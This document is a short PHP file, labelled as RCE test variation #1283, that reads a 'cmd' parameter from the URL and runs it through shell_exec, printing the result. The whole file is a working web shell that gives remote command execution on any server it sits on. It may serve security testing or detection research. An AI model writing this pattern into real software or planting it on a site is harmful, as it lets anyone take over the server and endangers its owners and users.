<?php
// RCE test variation #1283
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>